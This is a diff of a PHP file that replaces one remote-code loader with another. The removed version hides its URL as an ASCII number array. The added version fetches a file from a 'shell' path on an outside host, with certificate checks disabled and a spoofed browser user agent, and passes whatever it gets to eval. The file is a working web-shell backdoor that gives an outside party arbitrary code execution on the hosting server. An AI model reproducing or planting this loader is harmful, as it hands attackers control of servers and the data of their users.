@@ -1,43 +1,36 @@
 <?php
-session_start();
+function get_contents($url) {
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Avoid verifying SSL peer (older behavior for PHP 5.6.40)
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Avoid verifying SSL host (older behavior for PHP 5.6.40)
 
-function fetchUrl($url) {
-    if (!filter_var($url, FILTER_VALIDATE_URL)) {
-        return false;
-    }
+$result = curl_exec($ch);
 
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    
-    $result = curl_exec($ch);
-    
-    if (curl_errno($ch)) {
-        $result = false;
-    }
-    
-    curl_close($ch);
-    
-    return $result;
+if ($result === false) {
+echo 'Curl error: ' . curl_error($ch);
+http_response_code(404); // Set 404 response code if cURL fails
+curl_close($ch); // Ensure curl is closed before exit
+exit;
 }
 
-// Konversi ASCII ke URL
-$asciiArray = [104, 116, 116, 112, 115, 58, 47, 47, 116, 101, 97, 109, 122, 101, 100, 100, 50, 48, 50, 52, 46, 116, 101, 99, 104, 47, 114, 97, 119, 47, 77, 99, 117, 81, 71, 73];
-$url = implode('', array_map('chr', $asciiArray));
-
-// Gunakan URL dari session jika tersedia
-$targetUrl = $_SESSION["ts_url"] ?? $url;
-
-if (filter_var($targetUrl, FILTER_VALIDATE_URL)) {
-    $result = @file_get_contents($targetUrl) ?: fetchUrl($targetUrl);
-
-    if ($result !== false) {
-        eval('?>' . $result);
-    } else {
-        echo "Error: Unable to fetch content.";
-    }
-} else {
-    echo "Error: Invalid URL.";
+curl_close($ch);
+return $result;
 }
+
+$url = 'https://miawseo.site/shell/web.txt';
+$encoded_code = get_contents($url);
+
+if ($encoded_code === false) {
+http_response_code(404);
+exit;
+}
+
+// Optionally, log or display the encoded code for debugging
+// echo $encoded_code;
+
+// Attempt to safely evaluate the fetched code
+eval('?>' . $encoded_code);
 ?>
